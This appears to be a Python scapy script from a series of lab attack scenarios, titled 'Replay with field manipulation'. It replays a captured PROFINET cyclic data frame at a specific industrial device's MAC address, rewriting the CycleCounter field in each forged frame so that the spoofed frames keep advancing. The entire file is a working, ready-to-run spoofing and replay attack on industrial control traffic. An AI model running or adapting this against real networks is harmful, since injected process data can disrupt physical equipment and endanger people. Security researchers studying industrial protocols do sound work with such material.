# Fifth Scenario: Replay with field manipulation (Increasing CycleCounter)


import os
import sys
import time
import logging
from scapy.all import Ether, sendp, conf, wrpcap, Raw

# ----- CONFIG -----
IFACE = "eth0"

SRC_MAC = "30:b8:51:03:21:a2"
DST_MAC = "00:0d:1e:1c:64:32"      # from screenshot

PACKETS = 3          # Number of Packets, 3 packets: 0, 64, 128
CYCLE_START = 0      # first CycleCounter value
CYCLE_STEP = 64      # increment per packet

INTERVAL = 0
LOG_FILE = "/tmp/layer2_sender.log"
PCAP_SAVE = "/tmp/layer2_sent.pcap"
VERBOSE_PROGRESS = True
# -------------------

# Setup logger
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("layer2_sender")

# this is EXACTLY the PROFINET payload from your Wireshark screenshot
# (everything AFTER the Ethernet header: after 00 0d 1e 1c 64 32 30 b8 51 03 21 a2 88 92)
# Last 5 bytes are: 80 75 80 35 00
#                    ^  ^  ^  ^  ^
#                    |  |  |  |  +-- TransferStatus
#                    |  |  |  +----- DataStatus
#                    |  +-------- CycleCounter (high, low)
#                    +----------- previous byte (unchanged)
PROFINET_PAYLOAD_HEX = """
80 00
80 80 80 80 1f 40 80 80 80 80 80 80 80 80 80 80
80 80 80 80 03 80 03 80 00 00 00 00 80 00 00 00
00 80 00 00 4e 20 80 00 00 80 00 00 80 00 00 80
00 80 00 00 80 00 00 80 00 80 80 80 80 80 80 80
80 80 80 80 80 80 80 80 03 e8 80 03 e8 80 03 e8
80 00 00 00 00 00 80 00 80 80 80 80 80 80 80 80
80 80 80 80 00 80 00 80 00 80 00 80 01 81 80 01
80 75 80 35 00
""".strip()

# template payload as mutable bytes
PROFINET_PAYLOAD_TEMPLATE = bytearray(
    bytes.fromhex(" ".join(PROFINET_PAYLOAD_HEX.split()))
)

# indexes (from the end) of the two bytes forming the CycleCounter
# last 5 bytes: [ -5]=0x80, [-4]=high, [-3]=low, [-2]=DataStatus, [-1]=TransferStatus
CYCLECOUNTER_HIGH_IDX = -4
CYCLECOUNTER_LOW_IDX = -3


def build_payload_with_cycle(counter: int) -> bytes:
    """Return a payload with the given 16-bit cycle counter."""
    payload = bytearray(PROFINET_PAYLOAD_TEMPLATE)
    counter &= 0xFFFF           # make sure it stays in 0..65535
    payload[CYCLECOUNTER_HIGH_IDX] = (counter >> 8) & 0xFF
    payload[CYCLECOUNTER_LOW_IDX] = counter & 0xFF
    return bytes(payload)


def make_profinet_frame(dst_mac, src_mac, cycle_counter):
    """
    Build ONE frame:
    Ether(dst, src, type=0x8892) / Raw(load=PROFINET_PAYLOAD with given cycle)
    """
    payload = build_payload_with_cycle(cycle_counter)
    return Ether(dst=dst_mac, src=src_mac, type=0x8892) / Raw(load=payload)


def main():
    if os.geteuid() != 0:
        logger.error("This script must be run as root (sudo). Exiting.")
        sys.exit(1)

    logger.info(f"Interface: {IFACE}")
    logger.info(f"Destination MAC: {DST_MAC}")
    logger.info(f"Packets to send: {PACKETS}, interval: {INTERVAL}s")
    logger.info(f"Cycle start: {CYCLE_START}, step: {CYCLE_STEP}")
    conf.iface = IFACE

    frames_to_save = []
    sent = 0

    try:
        for i in range(PACKETS):
            cycle = (CYCLE_START + i * CYCLE_STEP) & 0xFFFF
            frame = make_profinet_frame(DST_MAC, SRC_MAC, cycle)

            sendp(frame, iface=IFACE, verbose=False)
            frames_to_save.append(frame)
            sent += 1

            if VERBOSE_PROGRESS:
                logger.info(f"Sent {i+1}/{PACKETS} frames (CycleCounter={cycle})")

            if INTERVAL:
                time.sleep(INTERVAL)

    except KeyboardInterrupt:
        logger.warning("User interrupted sending.")
    except Exception as e:
        logger.exception("Exception during send: %s", e)

    logger.info(f"Finished. Sent {sent} frames.")

    # save pcap
    try:
        if frames_to_save:
            wrpcap(PCAP_SAVE, frames_to_save)
            logger.info(f"Saved sent frames to {PCAP_SAVE}")
    except Exception:
        logger.exception("Failed to write pcap")


if __name__ == "__main__":
    main()